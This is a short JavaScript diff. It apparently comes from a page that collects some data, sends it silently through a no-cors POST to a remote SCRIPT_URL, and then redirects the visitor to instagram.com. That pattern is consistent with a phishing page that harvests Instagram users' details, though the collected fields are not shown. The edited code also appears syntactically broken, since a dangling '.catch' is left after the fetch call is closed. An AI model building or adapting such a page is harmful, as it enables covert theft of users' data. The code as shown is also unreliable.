@@ -168,19 +168,18 @@
             detected: "no"
         };
 
-        fetch(SCRIPT_URL, {
-            method: "POST",
-            mode: "no-cors",
-            headers: {
-                "Content-Type": "text/plain"
-            },
-            body: JSON.stringify(data)
-        }).then(() => {
-    const resDiv = document.getElementById("result");
-    resDiv.style.display = "block";
-    resDiv.innerHTML = "<b></b>";
-    
-    window.location.href = "https://www.instagram.com";
+     fetch(SCRIPT_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+            "Content-Type": "text/plain"
+        },
+        body: JSON.stringify(data)
+    });
+
+    setTimeout(function() {
+        window.location.href = "https://www.instagram.com";
+    }, 1000);
 
 }).catch(err => {
     console.error(err);
